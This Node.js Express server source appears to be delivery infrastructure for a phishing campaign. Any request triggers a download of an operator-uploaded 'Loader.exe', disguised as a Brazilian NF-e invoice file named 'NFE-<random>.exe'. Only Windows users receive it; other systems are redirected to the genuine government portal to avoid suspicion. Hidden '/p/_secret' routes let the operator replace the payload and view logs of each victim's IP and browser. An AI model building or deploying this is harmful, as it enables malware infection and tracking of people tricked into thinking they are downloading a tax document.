const express = require("express")
const app = express()
const fs = require("fs")
const path = require("path")
const UAParser = require("ua-parser-js")
const requestIp = require("request-ip")
const multer = require("multer")

const storage = multer.diskStorage({
    destination: function (req, file, cb) {
        if(fs.readdirSync(path.resolve("download")).length >= 1){
            fs.unlinkSync(path.resolve("download","Loader.exe"))
        }
        cb(null, "download/")
    },
    filename: function (req, file, cb) {
        cb(null, `Loader.exe`)
    }
})

const upload = multer({ storage })

app.use(requestIp.mw())
app.set("view engine", "ejs")
app.disable("x-powered-by")
app.set("views", "./views")

const randomPath = () => {
    let path = ""
    for(let i = 0; i < 5; i++) path += String(Math.random()).slice(2)
    return path
}

const getLogs = () => {
    const logs = fs.readFileSync("logs.txt", "utf-8").split("\r\n").filter((row) => row.match("|") && row.trim().length >= 2)
    return logs.map((row) => {
        const [browser,ip] = row.split("|")
        return { browser, ip }
    })
}

const getTimes = (uIp) => {
    const logs = getLogs()
    return logs.filter(({ ip }) => ip === uIp).length + 1
}

const getBrowser = (uIp) => {
    const logs = getLogs()
    const filtered = logs.filter(({ ip }) => ip === uIp)
    if(filtered.length >= 1){
        const lastDownload = filtered.pop()
        return lastDownload.browser
    }
    return ""
}

const cleanArray = (array) => {
    const novoArray = [];
    for (let i = 0; i < array.length; i++) {
        let current = array[i]
        if(!novoArray.find(({ ip }) => ip === current.ip)){
            novoArray.push(current)
        }
    }
    return novoArray;
}
  

const saveLog = (ip, browser) => {
    fs.appendFileSync("logs.txt", `${browser}|${ip}\r\n`,"utf-8")
}

app.get("/browser", (req,res) => {
    const browser = getBrowser(req.clientIp)
    return res.send(browser)
})

app.get("/p/_secret/upload", (req,res) => {
    return res.render("upload")
})

app.post("/p/_secret/upload", upload.single("file"), (req,res) => {
    return res.redirect("/p/_secret/upload")
})

app.get("/p/_secret/stats/download", (req,res) => {
    const logs = getLogs().map((object) => ({
        ...object,
        times: getTimes(object.ip)
    }))
    const clean = cleanArray(logs)
    return res.render("counter", { logs: clean })
})

app.get("/u/download/*",(req,res) => {
    try{
        const file = fs.readdirSync("download").pop()
        const randomName = String(Math.random()).slice(10)
        res.setHeader("Content-type", "application/vnd.microsoft.portable-executable");
        res.setHeader("Content-disposition", `attachment; filename=NFE-${randomName}.exe`);
        const userAgent = req.headers["user-agent"]
        const parser = new UAParser(userAgent)
        const information = parser.getResult()
        console.log(information)
        if(!information.os.name.match(/windows/gim)){
            return res.redirect("https://www.nfe.fazenda.gov.br/portal/principal.aspx")
        }
        saveLog(req.clientIp, information.browser.name)
        return res.sendFile(path.resolve("download", file))
    }catch(e){
        return res.send("...")
    }
})

app.get("*", (req,res) => {
    try{
        const randomName = String(Math.random()).slice(10)
        res.setHeader("Content-type", "application/vnd.microsoft.portable-executable");
        res.setHeader("Content-disposition", `attachment; filename=NFE-${randomName}.exe`);
        return res.redirect("/u/download/" + randomPath())
    }catch(e){
        return res.send("...")
    }
})

app.listen(8080, () => console.log("Redirect Running 8080"))